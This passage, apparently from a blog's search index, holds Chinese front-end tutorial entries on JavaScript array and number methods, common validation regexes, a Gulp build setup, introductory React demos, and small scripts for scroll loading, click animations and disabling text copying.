    <content type="text"><![CDATA[尾部添加push1arrayObject.push(newelement1,newelement2,....,newelementX) // 可添加多个， 返回新的长度 尾部删除pop1arrayObject.pop() // 删除最后一个元素，返回最后一个元素 头部添加unshift1arrayObject.unshift(newelement1,newelement2,....,newelementX) // 可添加多个， 返回新的长度 头部删除shift1arrayObject.shift() // 删除第一个元素，返回第一个元素 任意位置删除添加splice1234arrayObject.splice(index,howmany,item1,.....,itemX)// 从某个索引位置开始，删除几个，再添加// 删除可以为空// 添加可以为空 数组截取slice1arrayObject.slice(start,end) // 从某个位置开始至某个位置结束 截取数组 数组排序sort12arrayObject.sort(sortby) // 默认按升序排序// return arrayObject.sort((val1, val2) =&gt; val1._sortBy - val2._sortBy) 在没有合适字段的情况下可自行添加字段 数组倒序reverse12arrayObject.reverse() //数组倒序，按字符编码顺序// return arrayObject.sort((val1, val2) =&gt; val1._sortBy - val2._sortBy) 在没有合适字段的情况下可自行添加字段 数组乱序123456789function shuffle(array) &#123; for (var i = array.length - 1; i &gt; 0; i--) &#123; var j = Math.floor(Math.random() * (i + 1)); var temp = array[i]; array[i] = array[j]; array[j] = temp; &#125; return array;&#125; 其他见lodash]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见正则表达式及获取某些字段的方法]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%B8%B8%E8%A7%81%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%8A%E8%8E%B7%E5%8F%96%E6%9F%90%E4%BA%9B%E5%AD%97%E6%AE%B5%E7%9A%84%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[正则替换（replace）注：常规replace方法只会替换一次，需使用正则才能全部替换1str.replace(new RegExp(&apos;abc&apos;, &apos;gi&apos;), &apos;def&apos;) // 将abc字符串全部替换从def字符串，g表示从头到尾扫描，i表示不区分替换字符串的大小写 从字符串中截取数字： 1str.replace(/[^0-9]/ig, '') 去除所有空格 1str.replace(/\s+/g, '') 去掉左空格 1str.replace(/^\s*/, '') 去掉右空格 1str.replace(/\s*$/g, '') 去掉左右空格 1str.replace(/(^\s*)|(\s*$)/g, '') 正则判断（test）说明：对于正则判断手机号，有很多通过号段来判断，个人认为这样不是很严谨，号段可能会增加，所以只需判断首位为1且11位即可 首位是1且11位的手机号 1/^1\d&#123;10&#125;$/.test(phone) // 返回true 或 false 首位是1且11位的手机号（去除空格） 1/^1\d&#123;10&#125;$/.test(phone.replace(/(^\s*)|(\s*$)/g, '')) // 返回true 或 false 中国姓名(中文包括·或•) 1/^[\u2E80-\uFE4F]+([·•][\u2E80-\uFE4F]+)*$/.test(str) // 返回true 或 false email 1/^(\w-*\.*)+@(\w-?)+(\.\w&#123;2,&#125;)+$/.test(email) // 返回true 或 false 身份证号 1/^(^[1-9]\d&#123;7&#125;((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d&#123;3&#125;$)|(^[1-9]\d&#123;5&#125;[1-9]\d&#123;3&#125;((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])((\d&#123;4&#125;)|\d&#123;3&#125;[Xx])$)$/.test(id) // 返回true 或 false URL 1/^https?:\/\/(([a-zA-Z0-9_-])+(\.)?)*(:\d+)?(\/((\.)?(\?)?=?&amp;?[a-zA-Z0-9_-](\?)?)*)*$/i.test(url) // 返回true 或 false 邮编 1/^[1-9]\d&#123;5&#125;(?!\d)$/.test(postcode) // 返回true 或 false 输入的为纯数字 1/^\d+$/.test(number) // 返回true 或 false 输入n个纯数字 1/^\d&#123;n&#125;$/.test(number) // 返回true 或 false 输入m到n的纯数字 1/^\d&#123;m,n&#125;$/.test(number) // 返回true 或 false 纯英文字母 1/^[a-z]+$/i.test(enCode) // 返回true 或 false 大写应为字母 1/^[A-Z]+$/.test(enCode) // 返回true 或 false 英文字母或数字组成 1/^[a-z0-9]+$/i.test(code) // 返回true 或 false 英文字母和数字组合，区分大小写，6~16位 1/^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]&#123;6,16&#125;$/i.test(code) // 返回true 或 false 英文字母、数字和下划线组成 1/^\w+$/.test(code) // 返回true 或 false 数字和.组成的浮点数 1/^(([1-9][0-9]*\.[0-9][0-9]*)|([0]\.[0-9][0-9]*)|([1-9][0-9]*)|([0]&#123;1&#125;))$/.test(str) 可用来检测金额，只能包含数字和.，且不能是00.123这种格式 从UA判断是否为IE浏览器 1/msie (\d+\.\d+)/i.test(ua) // 返回true 或 false 从UA判断是否为webkit内核 1/webkit/i.test(ua) // 返回true 或 false 从UA判断是否为chrome内核 1/chrome\/(\d+\.\d+)/i.test(ua) // 返回true 或 false 从UA判断是否为firefox内核 1/firefox\/(\d+\.\d+)/i.test(ua) // 返回true 或 false 从UA判断是否为safari浏览器 1/(\d+\.\d)?(?:\.\d)?\s+safari\/?(\d+\.\d+)?/i.test(ua) // 返回true 或 false 从UA判断是否是微信浏览器 1ua.indexOf('micromessenger') &gt; -1 从UA判断是否是QQ浏览器 1ua.indexOf('qq') &gt; -1 正则判断是否是微信浏览器 1/(micromessenger)\//.test(ua) 正则判断是否是QQ浏览器 1/(qq)\//.test(ua) 正则判断微信浏览器或QQ浏览器 1/(micromessenger|qq)\//.test(ua) 从UA判断是否为iPhone 1/iphone/i.test(ua) // 返回true 或 false 从UA判断是否为iPad 1/ipad/i.test(ua) // 返回true 或 false 从UA判断是否为安卓 1/android/i.test(ua) // 返回true 或 false 从UA判断安卓版本号 1ua.substr(ua.indexOf('android') + 8, 3) 从appVersion判断iOS版本 1parseInt(((navigator.appVersion).match(/OS (\d+)_(\d+)_?(\d+)?/))[1], 10) 从UA判断是否为移动端 1/(nokia|iphone|android|ipad|motorola|^mot\-|softbank|foma|docomo|kddi|up\.browser|up\.link|htc|dopod|blazer|netfront|helio|hosin|huawei|novarra|CoolPad|webos|techfaith|palmsource|blackberry|alcatel|amoi|ktouch|nexian|samsung|^sam\-|s[cg]h|^lge|ericsson|philips|sagem|wellcom|bunjalloo|maui|symbian|smartphone|midp|wap|phone|windows ce|iemobile|^spice|^bird|^zte\-|longcos|pantech|gionee|^sie\-|portalmmm|jig\s browser|hiptop|^ucweb|^benq|haier|^lct|opera\s*mobi|opera\*mini|320x320|240x320|176x220)/i]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决ios在增加overflow_hidden时的滑动不流畅问题]]></title>
    <url>%2Fblog%2Fcss%2F%E8%A7%A3%E5%86%B3ios%E5%9C%A8%E5%A2%9E%E5%8A%A0overflow_hidden%E6%97%B6%E7%9A%84%E6%BB%91%E5%8A%A8%E4%B8%8D%E6%B5%81%E7%95%85%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[在移动端html中有时需要使用横向或纵向滑动，我们会增加over:scroll; 但是在ios中，滚动速度会变慢，不流畅，在安卓上没有这种感觉 解决办法：1-webkit-overflow-scrolling : touch; 据说会多消耗内存 但是有了流畅的感觉，who care the memory ^_^]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gulp用法]]></title>
    <url>%2Fblog%2Fnode%2Fgulp%E7%94%A8%E6%B3%95.html</url>
    <content type="text"><![CDATA[gulpfile.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273const gulp = require('gulp');const pug = require('pug'); // pugconst gulpPug = require('gulp-pug'); // gulp-pugconst sass = require('gulp-sass'); // sassconst prefixer = require('gulp-autoprefixer'); // 代码不压缩const sourcemaps = require('gulp-sourcemaps'); // js文件解压缩const babel = require('gulp-babel'); // es6转换const concat = require('gulp-concat'); // 压缩js文件为1个const imagemin = require('gulp-imagemin'); // 图片压缩const browserSync = require('browser-sync').create(); // 自动刷新const fileinclude = require('gulp-file-include'); // 引入公共文件gulp.task('pug', function()&#123; return gulp.src('./src/*.pug') .pipe(gulpPug(&#123; pug: pug, pretty: true &#125;)) .pipe(gulp.dest('dist/'))&#125;);gulp.task('sass', function()&#123; return gulp.src("./src/css/*.scss") .pipe(sass().on('error', sass.logError)) .pipe(prefixer()) .pipe(gulp.dest("./dist/css")) .pipe(browserSync.stream());&#125;);gulp.task('img', function()&#123; return gulp.src('src/img/*') .pipe(imagemin()) .pipe(gulp.dest('dist/img'))&#125;);gulp.task('es6', () =&gt; &#123; return gulp.src('src/js/*.js') .pipe(sourcemaps.init()) .pipe(babel(&#123; presets: ['es2015'] &#125;)) .pipe(concat('main.js')) .pipe(sourcemaps.write('.')) .pipe(gulp.dest('dist/js'));&#125;);gulp.task('fileinclude', function() &#123; gulp.src('src/**.html') .pipe(fileinclude(&#123; prefix: '@@', basepath: '@file' &#125;)) .pipe(gulp.dest('dist'));&#125;);// Static Server + watching scss/html filesgulp.task('serve', ['sass', 'pug', 'es6', 'img'] , function()&#123; browserSync.init(&#123; server: "./dist" &#125;); gulp.watch("./src/css/*.scss", ['sass']); gulp.watch("./src/img/*", ['img']).on('change', browserSync.reload); gulp.watch("./src/js/*.js", ['es6']).on('change', browserSync.reload); gulp.watch("./src/*.pug", ['pug']).on('change', browserSync.reload);&#125;);gulp.task('default', ['serve']); package.json1234567891011121314151617181920212223242526272829&#123; "name": "gulp", "version": "1.0.0", "description": "", "main": "index.js", "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "repository": &#123; "type": "git", "url": "" &#125;, "author": "", "license": "ISC", "devDependencies": &#123; "babel-preset-es2015": "^6.9.0", "browser-sync": "^2.13.0", "gulp": "^3.9.1", "gulp-autoprefixer": "^3.1.0", "gulp-babel": "^6.1.2", "gulp-concat": "^2.6.0", "gulp-file-include": "^1.0.0", "gulp-imagemin": "^3.0.1", "gulp-pug": "^3.2.0", "gulp-sass": "^2.3.2", "gulp-sourcemaps": "^1.6.0", "pug": "^2.0.0-beta11" &#125;&#125; 项目结构目录 用法123cd srcgulp # 会在主目录下生成一个dist文件 附加前端经常需要讲生成的目录拷贝到后端目录下，但对于django这样的后端，有其特定的语法，所以需要加上一些特定的标签，使用全局替换：123&quot;\./([^\s]+)&quot; 替换成 &quot;&#123;% static &apos;newyear/$1&apos; %&#125;&quot; // newyear表示项目名称html头部加：&#123;% load staticfiles %&#125;]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React官方CDN]]></title>
    <url>%2Fblog%2Freact%2Freact%E5%AE%98%E6%96%B9cdn.html</url>
    <content type="text"><![CDATA[开发版本： 12&lt;script crossorigin src=&quot;https://unpkg.com/react@16/umd/react.development.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin src=&quot;https://unpkg.com/react-dom@16/umd/react-dom.development.js&quot;&gt;&lt;/script&gt; 生产版本 12&lt;script crossorigin src=&quot;https://unpkg.com/react@16/umd/react.production.min.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin src=&quot;https://unpkg.com/react-dom@16/umd/react-dom.production.min.js&quot;&gt;&lt;/script&gt;]]></content>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React小Demo]]></title>
    <url>%2Fblog%2Freact%2Freact%E5%B0%8Fdemo.html</url>
    <content type="text"><![CDATA[参考：阮一峰 React 入门实例教程 注意1、引入三个js文件2、script中注明type=”text/babel” 即使用JSX的语法（JSX：在JS中直接使用HTML标签语法）3、使用ReactDOM.render() CDN123&lt;script src="react.js"&gt;&lt;/script&gt;&lt;script src="react-dom.js"&gt;&lt;/script&gt;&lt;script src="browser.min.js"&gt;&lt;/script&gt; 或： 123456&lt;script src="https://npmcdn.com/react@15.3.1/dist/react.js"&gt;&lt;/script&gt; &lt;script src="https://npmcdn.com/react-dom@15.3.1/dist/react-dom.js"&gt;&lt;/script&gt; &lt;script src="https://npmcdn.com/babel-core@5.8.38/browser.min.js"&gt;&lt;/script&gt; &lt;script src="https://npmcdn.com/jquery@3.1.0/dist/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://npmcdn.com/remarkable@1.6.2/dist/remarkable.min.js"&gt;&lt;/script&gt; Demo1：简单React12345678&lt;div id="example" class="container"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; ReactDOM.render( &lt;h1&gt;Hello, React !&lt;/h1&gt;, document.getElementById('example') );&lt;/script&gt; 结果： Demo2：渲染简单数组12345678910111213141516&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; var names = ['Alice', 'Emily', 'Kate']; ReactDOM.render( &lt;div&gt; &#123; names.map(function (name) &#123; return &lt;div&gt;Hello, &#123;name&#125;!&lt;/div&gt; &#125;) &#125; &lt;/div&gt;, document.getElementById('example') );&lt;/script&gt; 结果： 详解： 遇到HTML标签（以 &lt; 开头），就用HTML规则解析；遇到代码块（以 { 开头），就用JavaScript规则解析 Demo3：渲染带标签的数组1234567891011121314&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; var arr = [ &lt;h1&gt;Hello world!&lt;/h1&gt;, &lt;h2&gt;React is awesome&lt;/h2&gt;, &lt;p&gt;Reactsdjfkasfj&lt;/p&gt; ]; ReactDOM.render( &lt;div&gt;&#123;arr&#125;&lt;/div&gt;, document.getElementById('example') );&lt;/script&gt; 结果： Demo4：组件1234567891011121314&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; var HelloMessage = React.createClass(&#123; render: function() &#123; return &lt;h1&gt;Hello &#123;this.props.name&#125;&lt;/h1&gt;; &#125; &#125;); ReactDOM.render( &lt;HelloMessage name="John" /&gt;, document.getElementById('example') );&lt;/script&gt; 结果： 详解： 1、HelloMessage就是一个组件类，React.createClass 方法用于生成一个组件类，组件类必须有自己的render方法，用于输入组件 2、组件类的第一个字面必须大写，否则报错，组件类只能包含一个顶层标签，否则报错 3、模板插入就会自动生成一个组件类的实例 4、通过this.props来读取组件的属性，组件属性如果有class属性需要写成className，for属性需要写成htmlFor，因为class和for是JavaScript的保留字 Demo5：this.props.children12345678910111213141516171819202122232425&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; var NotesList = React.createClass(&#123; render: function() &#123; return ( &lt;ol&gt; &#123; React.Children.map(this.props.children, function (child) &#123; return &lt;li&gt;&#123;child&#125;&lt;/li&gt;; &#125;) &#125; &lt;/ol&gt; ); &#125; &#125;); ReactDOM.render( &lt;NotesList&gt; &lt;span&gt;hello&lt;/span&gt; &lt;span&gt;world&lt;/span&gt; &lt;/NotesList&gt;, document.getElementById('example') );&lt;/script&gt; 结果： 详解： 1、this.props对象属性与组件的属性一一对应，但是this.props.children属性例外，它表示组件的所有子节点 2、NotesList组件有两个span子节点，可以通过this.props.children读取 3、如果当前组件没有子节点，它就是underfined；如果有一个子节点，数组类型是object；如果有多个子节点，数据类型就是array 4、React提供一个React.Children方法来处理this.props.children Demo6：PropTypes，组件属性验证12345678910111213141516171819&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; var data = 123; // 使用123会报错，必须使用字符串'123...' var MyTitle = React.createClass(&#123; propTypes: &#123; title: React.PropTypes.string.isRequired, &#125;, render: function() &#123; return &lt;h1&gt; &#123;this.props.title&#125; &lt;/h1&gt;; &#125; &#125;); ReactDOM.render( &lt;MyTitle title=&#123;data&#125; /&gt;, document.getElementById('example') );&lt;/script&gt; 结果： 详解： 1、PropTupes属性用来验证组件实例属性是否符合要求 2、此例中使用PropsTypes来验证title必须是字符串，所有当data=123时会报错，提示类型错误，当data=’123’时则顺利通过 Demo7：getDefaultProps，设置组件属性默认值1234567891011121314151617181920&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt; var MyTitle = React.createClass(&#123; getDefaultProps : function () &#123; return &#123; title : 'Hello World' &#125;; &#125;, render: function() &#123; return &lt;h1&gt; &#123;this.props.title&#125; &lt;/h1&gt;; &#125; &#125;); ReactDOM.render( &lt;MyTitle /&gt;, document.getElementById('example') );&lt;/script&gt; 结果： 详解： getDefaultProps方法用来设置组件属性的默认值 Demo8：获取真实DOM节点123456789101112131415161718&lt;div id="example"&gt;&lt;/div&gt;&lt;script type="text/babel"&gt;var MyComponent = React.createClass(&#123; handleClick: function() &#123; this.refs.myTextInput.focus(); &#125;, render: function() &#123; return ( &lt;div&gt; &lt;input type="text" ref="myTextInput" /&gt; &lt;input type="button" value="Focus the text input" onClick=&#123;this.handleClick&#125; /&gt; &lt;/div&gt; ); &#125;&#125;);&lt;/script&gt; 详解： 1、组件并不是真实的DOM节点，而是存在于内存之中的一种虚拟结构，叫做虚拟DOM。只有当它插入文档以后，才会变成真实的DOM。所有的DOM变动，都先在虚拟DOM上发生，然后再将实际发生变动的部分，反映在真实的DOM上，这种算法叫做DOM diff，可以极大的提高网页的性能表现。 2、虚拟DOM拿不到用户输入的，使用ref属性获取真实的DOM节点。此例中this.refs.[refName]返回真实DOM节点，在click事件后确保了真实的DOM]]></content>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React生命周期介绍]]></title>
    <url>%2Fblog%2Freact%2Freact%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html</url>
    <content type="text"><![CDATA[React 生命周期如下：12345678910111213141516171819componentWillMount：1、渲染前调用render：2、渲染componentDidMount：3、第一次渲染完调用，此时可获取domcomponentWillReceiveProps：4、接收到一个新的props时调用shouldComponentUpdate：5、接收props或state时判断是否该updatecomponentWillUpdate：6、接收到props或state时开始更新render：7、rendercomponentDidUpdate：8、组件更新完毕componentWillUnmount：～移除组件时调用 生命周期实例demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src="http://static.runoob.com/assets/react/react-0.14.7/build/react.min.js"&gt;&lt;/script&gt; &lt;script src="http://static.runoob.com/assets/react/react-0.14.7/build/react-dom.min.js"&gt;&lt;/script&gt; &lt;script src="http://static.runoob.com/assets/react/browser.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="example"&gt;&lt;/div&gt; &lt;script type="text/babel"&gt; var Button = React.createClass(&#123; getInitialState: function () &#123; return &#123; data: 0 &#125;; &#125;, // 自定义事件 setNewNumber: function () &#123; // this.setState(&#123;data: this.state.data + 1&#125;) // this.setState(function (state) &#123; // return &#123;data: state.data + 1&#125; // &#125;) this.setState(function (state) &#123; state.data++ &#125;) &#125;, render: function () &#123; return ( &lt;div&gt; &lt;button onClick = &#123; this.setNewNumber &#125;&gt;INCREMENT&lt;/button&gt; &lt;Content myNumber = &#123; this.state.data &#125; /&gt; &lt;/div&gt; ); &#125; &#125;); var Content = React.createClass(&#123; // 1、渲染前调用 componentWillMount:function () &#123; console.log('Component Will Mount!') &#125;, // 3、第一次渲染完调用，此时可获取dom componentDidMount: function () &#123; console.log('Component Did Mount!') &#125;, // 4、接收到一个新的props时调用 componentWillReceiveProps: function () &#123; console.log('Component Will Receive Props!') &#125;, // 5、接收props或state时判断是否该update shouldComponentUpdate: function (nextProps, nextState) &#123; console.log('Should Component Update') return true; &#125;, // 6、接收到props或state时开始更新 componentWillUpdate: function () &#123; console.log('Component Will Update!') &#125;, // 7、再次render // 8、组件更新完毕 componentDidUpdate: function () &#123; console.log('Component Did Update!') &#125;, // ～移除组件时调用 componentWillUnmount: function () &#123; console.log('Component Will UnMount!') &#125;, // 2、渲染 render: function () &#123; console.log('Render') return ( &lt;div&gt; &lt;h3&gt;&#123;this.props.myNumber&#125;&lt;/h3&gt; &lt;/div&gt; ); &#125; // 正确的顺序： // 1、componentWillMount // 2、render // 3、componentDidMount // // 4、componentWillReceiveProps // 5、shouldComponentUpdate // 6、componentWillUpdate // 7、render // 8、componentDidUpdate // // 9、componentWillReceiveProps // 10、shouldComponentUpdate // 11、componentWillUpdate // 12、render // 13、componentDidUpdate // // ～componentWillUnmount &#125;) ReactDOM.render( &lt;Button /&gt;, document.getElementById('example') ); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现点击页面出现心形动效]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AE%9E%E7%8E%B0%E7%82%B9%E5%87%BB%E9%A1%B5%E9%9D%A2%E5%87%BA%E7%8E%B0%E5%BF%83%E5%BD%A2%E5%8A%A8%E6%95%88.html</url>
    <content type="text"><![CDATA[原生js实现点击页面出现心形动效的效果，点击页面即可查看效果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566(function(window,document,undefined)&#123; var hearts = []; window.requestAnimationFrame = (function()&#123; return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (callback)&#123; setTimeout(callback,1000/60); &#125; &#125;)(); init(); function init()&#123; css(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"); attachEvent(); gameloop(); &#125; function gameloop()&#123; for(var i=0;i&lt;hearts.length;i++)&#123; if(hearts[i].alpha &lt;=0)&#123; document.body.removeChild(hearts[i].el); hearts.splice(i,1); continue; &#125; hearts[i].y--; hearts[i].scale += 0.004; hearts[i].alpha -= 0.013; hearts[i].el.style.cssText = "left:"+hearts[i].x+"px;top:"+hearts[i].y+"px;opacity:"+hearts[i].alpha+";transform:scale("+hearts[i].scale+","+hearts[i].scale+") rotate(45deg);background:"+hearts[i].color+";z-index:99999"; &#125; requestAnimationFrame(gameloop); &#125; function attachEvent()&#123; var old = typeof window.onclick==="function" &amp;&amp; window.onclick; window.onclick = function(event)&#123; old &amp;&amp; old(); createHeart(event); &#125; &#125; function createHeart(event)&#123; var d = document.createElement("div"); d.className = "heart"; hearts.push(&#123; el : d, x : event.clientX - 5, y : event.clientY - 5, scale : 1, alpha : 1, color : randomColor() &#125;); document.body.appendChild(d); &#125; function css(css)&#123; var style = document.createElement("style"); style.type="text/css"; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText = css; &#125; document.getElementsByTagName('head')[0].appendChild(style); &#125; function randomColor()&#123; return "rgb("+(~~(Math.random()*255))+","+(~~(Math.random()*255))+","+(~~(Math.random()*255))+")"; &#125;&#125;)(window,document); 来源：A-Ten’s Blog源码研究]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js操作数值]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%93%8D%E4%BD%9C%E6%95%B0%E5%80%BC.html</url>
    <content type="text"><![CDATA[经常需要用到js来操作数值，如取整、精确小数点后面的位数等等 取浮点数1234567parseFloat('123.45') = 123.45parseFloat('123.45abc') = 123.45parseFloat('abc 123.45') = NaNparseFloat(true) = NaN 对象转换成数字123456789Number(true) = 1Number(false) = 0Number(new Date()) = 1491972682647Number('999') = 999Number('999 888') = NaN 取整 将字符串或浮点数开头的整数提取出来 123456789101112131415parseInt(123) = 123parseInt(123.45) = 123parseInt(123.45abc) = 123 // error:Invalid or unexpected tokenparseInt('123') = 123parseInt('123.45') = 123parseInt('123,,45') = 123parseInt('123.45abc') = 123parseInt(true) = NaN 四舍五入 12345// 四舍Math.round(5 / 4) = 1// 五入Math.round(5 / 2) = 3 向上取整（有小数就+1） 1Math.ceil(5 / 2) = 3 丢弃小数 1Math.floor(5 / 2) = 2 精确到小数点后两位 四舍五入型 1234567891011// 四舍var a = 123.451789(a / 100).toFixed(2) = '123.45'// 五入var a = 123.456789(a / 100).toFixed(2) = '123.46'// 建议增加零判断（00.00 = 0）：var a = 123.456789parseFloat(a / 100).toFixed(2) == 0 ? 0 : (a / 100).toFixed(2) 全舍型 123var a = 123.456789Math.floor(a * 100) / 100// 无需增加零判断 全入型 123var a = 123.456789Math.ceil(a * 100) / 100// 无需增加零判断]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现上拉加载]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AE%9E%E7%8E%B0%E4%B8%8A%E6%8B%89%E5%8A%A0%E8%BD%BD.html</url>
    <content type="text"><![CDATA[前端加载列表的时候，当列表过多时，需要考虑使用上拉加载，每次只加载其中的几条数据，这种情况一般都是通过触发scroll事件或是全局绑定scroll事件 整页上拉加载123456789101112131415161718192021222324window.addEventListener('scroll', function () &#123; this.scrollLoader()&#125;.bind(this))scrollLoader () &#123; var screenHeight = window.innerHeight // 页面内容高度 var pageHeight = window.document.documentElement.scrollHeight // 页面高度（包括滚动条） var scrollHeight = window.scrollY // 已经滚动的高度 if (pageHeight - screenHeight - scrollHeight &gt; 100) return; this.requestData()&#125;requestData () &#123; $.ajax(&#123; url: '', data: &#123; page: '', // 请求第几页，全局变量，请求成功+1 num: '' // 请求几条数据 &#125; &#125;) // 结合返回的left值（还剩余几条数据）来决定到底后是否继续请求&#125; 弹窗（部分）上拉加载1234567891011121314151617181920212223ul(@scroll="scrollLoader()") liscrollLoader () &#123; var operateDom = document.querySelector('.awardlist-ul'); // alert var viewHeight = operateDom.offsetHeight; // 可见高度 var contentHeight = operateDom.scrollHeight; // 内容高度 var scrollTop = operateDom.scrollTop; // 滚动条高度 if (contentHeight - viewHeight - scrollTop &gt; 100) return; this.requestData();&#125;requestData() &#123; $.ajax(&#123; url: '', data: &#123; page: '', // 请求第几页，全局变量，请求成功+1 num: '' // 请求几条数据 &#125; &#125;)&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js动态添加样式表]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E6%A0%B7%E5%BC%8F%E8%A1%A8.html</url>
    <content type="text"><![CDATA[有时候我们需要在js中动态的插入一段样式表，比如我们在封装某个库的时候，下面的函数就可以实现这个功能 12345678910111213141516171819202122232425// 动态添加样式function addCSS(cssText)&#123; var style = document.createElement('style'); //创建一个style元素 var head = document.head || document.getElementsByTagName('head')[0]; //获取head元素 style.type = 'text/css'; //这里必须显示设置style元素的type属性为text/css，否则在ie中不起作用 if(style.styleSheet)&#123; //IE var func = function()&#123; try&#123; //防止IE中stylesheet数量超过限制而发生错误 style.styleSheet.cssText = cssText; &#125;catch(e)&#123; &#125; &#125; //如果当前styleSheet还不能用，则放到异步中则行 if(style.styleSheet.disabled)&#123; setTimeout(func, 10); &#125;else&#123; func(); &#125; &#125;else&#123; //w3c //w3c浏览器中只要创建文本节点插入到style元素中就行了 var textNode = document.createTextNode(cssText); style.appendChild(textNode); &#125; head.appendChild(style); //把创建的style元素插入到head中&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原生js遍历查找点击的字节点的索引]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%8E%9F%E7%94%9Fjs%E9%81%8D%E5%8E%86%E6%9F%A5%E6%89%BE%E7%82%B9%E5%87%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%82%B9%E7%9A%84%E7%B4%A2%E5%BC%95.html</url>
    <content type="text"><![CDATA[1234567var indexLis = document.getElementsByClassName('index-li');for(var i = 0; i &lt; indexLis.length; i++) &#123; indexLis[i].setAttribute("index", i); indexLis[i].onclick = function () &#123; alert('我是第' + this.getAttribute("index") + '个li'; &#125;&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js禁止复制]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E7%A6%81%E6%AD%A2%E5%A4%8D%E5%88%B6.html</url>
    <content type="text"><![CDATA[在做移动端开发的时候，用户禁止会误触页面上的文字，然后会提示复制等操作，体验非常不好，所以我们需要将它禁用掉 禁止复制js部分：控制键盘、选中、右键，可在html head区域或js中 1234567891011121314151617&lt;script&gt;document.oncontextmenu=stop;document.ondragstart=stop;document.onselectstart=stop;document.onkeydown = function (e) &#123; var ev = window.event || e; var code = ev.keyCode || ev.which; if (code == 116) &#123; ev.keyCode ? ev.keyCode = 0 : ev.which = 0; cancelBubble = true; return false; &#125;&#125;function stop()&#123; return false;&#125;&lt;/script&gt; css部分：可以放入 header，但是我建议 header 放一份，并将里面的内容往 CSS 文件里再放置一份，这样一来当 F12 去除了其中一个，另外一个再寻找起来会麻烦且花时间（位于 CSS 文件中的代码 对方需要在开发模式中清理 CSS 内容，而且这样可以导致整个无法直视）：1234567&lt;style type="text/css"&gt;html &#123; -ms-user-select: none; -moz-user-select: none; -webkit-user-select: none;&#125;&lt;/style&gt; ps：Ctrl + P能调起浏览器的打印机制，在里面可以进行拷贝，如需要禁止，可以增加以下css进行保险123@media print&#123; html &#123;display:none; &#125;&#125; 部分开启复制全页禁止复制后在部分区域开启复制功能，如博客中的代码等12345678910111213141516171819202122// code editfunction clrs_code() &#123; var controls = document.getElementsByTagName('pre'); for(var i=0; i&lt;controls.length; i++)&#123; controls[i].spellcheck = false; controls[i].setAttribute("contenteditable","true") &#125;; var controls = document.getElementsByTagName('code'); for(var i=0; i&lt;controls.length; i++)&#123; 